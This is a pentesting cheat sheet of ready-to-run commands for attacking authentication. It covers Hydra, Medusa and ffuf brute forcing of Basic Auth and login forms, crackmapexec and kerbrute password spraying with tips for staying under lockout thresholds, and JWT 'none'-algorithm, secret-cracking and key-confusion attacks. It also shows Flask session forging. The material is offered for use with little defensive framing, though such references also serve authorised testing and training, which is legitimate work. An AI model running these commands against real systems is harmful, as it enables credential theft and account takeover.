
## HTTP Basic Auth Brute Force

Use if server returns `WWW-Authenticate: Basic` header login popup in browser

```bash
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get / -t 10

hydra -L users.txt -P passwords.txt target.com http-get /protected/

# Medusa
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/protected

# curl manual test
curl -u admin:password123 https://target.com/protected/
curl -u admin:password123 -I https://target.com/admin/

# Burp Intruder
# Send request with Authorization: Basic <base64> header to Intruder
# Payload: base64 encode username:password combos
```

Try for default credentials first then the company name, domain name, and service name as passwords.

---

## Login Form Brute Force

```bash
# Hydra HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# Hydra with cookies/tokens (CSRF)
hydra -l admin -P rockyou.txt target.com \
  http-post-form "/login:user=^USER^&pass=^PASS^&token=csrf123:F=incorrect" -t 10

# ffuf
ffuf -w /usr/share/wordlists/rockyou.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fc 200 -fw 100

# ffuf username enumeration first
ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -u https://target.com/login \
  -X POST \
  -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fw 100

# Burp Intruder: Pitchfork for user+pass, Sniper for password only
```

**Tips:**
- [ ] Identify failure string for Hydra `-F` flag
- [ ] Check if CSRF token is required then grab it dynamically or use Burp
- [ ] Check for account lockout and slow down or use spraying instead
- [ ] Try to enumerate valid usernames first via different error messages
- [ ] Try default creds before full brute force 
- [ ] Check if app uses JSON body instead of form data and adjust `Content-Type` and body format accordingly

---

## Password Spraying

```bash
# crackmapexec: SMB spraying
crackmapexec smb target.com -u users.txt -p 'Password123!' --continue-on-success

# kerbrute: AD user spraying
kerbrute passwordspray -d domain.local users.txt 'Password123!'

# Hydra with delay
hydra -L users.txt -p 'Password123!' target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 1 -W 30

# spray.py for O365/AD
python3 spray.py -u users.txt -p 'Password123!' -d domain.com

# Build user list from LDAP/Kerberos enumeration
kerbrute userenum -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Tips:**
- [ ] Build valid user list first for LDAP, Kerberos enum, OSINT, LinkedIn
- [ ] Check password policy before spraying to avoid lockout threshold and wait between sprays, like 30 mins or so.
- [ ] Spray season-based passwords: `Winter2024!`, `Spring2024!`, `Company123!`
- [ ] Try blank password and username=password combos
- [ ] Check local admin accounts separately as often different lockout policy
- [ ] Must try variations etc of wordlists if no hits.

---

## Cookie & Session Abuse

```bash
# Decode and inspect JWT
# Paste token at jwt.io or:
echo "eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# JWT None algorithm attack
# Change alg to none, remove signature
python3 jwt_tool.py <token> -X a

# JWT secret brute force
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# JWT key confusion (RS256 → HS256)
python3 jwt_tool.py <token> -X k -pk public.pem

# Cookie decode: base64
echo "cookie_value" | base64 -d

# Flask session decode
flask-unsign --decode --cookie "session_cookie_value"

# Flask session forge (if secret known)
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'known_secret'

# Check cookie flags
# In Burp: look for Secure, HttpOnly, SameSite flags in Set-Cookie header

# Session fixation test
# 1. Get session before login
# 2. Log in
# 3. Check if session ID changed: if not, fixation possible

# Session prediction: check if tokens are sequential or time-based
seq 1 100 | while read i; do
  echo "token_prefix_$i"
done
```

**Tips:**
- [ ] Check cookie flags for missing Secure, HttpOnly, SameSite
- [ ] Decode cookie like base64, JWT, Flask session, custom encoding
- [ ] JWT: test none algorithm, brute force secret, key confusion
- [ ] Check if session ID changes after login i.e. fixation
- [ ] Check if session ID changes after logout i.e. its not actually invalidating
- [ ] Test if old session tokens still work after password change
- [ ] Check for session tokens in URL parameters instead of cookies
- [ ] Test for CSRF if SameSite=None or missing
- [ ] Check response headers on every page because sometimes session tokens leak in custom headers like `X-Auth-Token`

---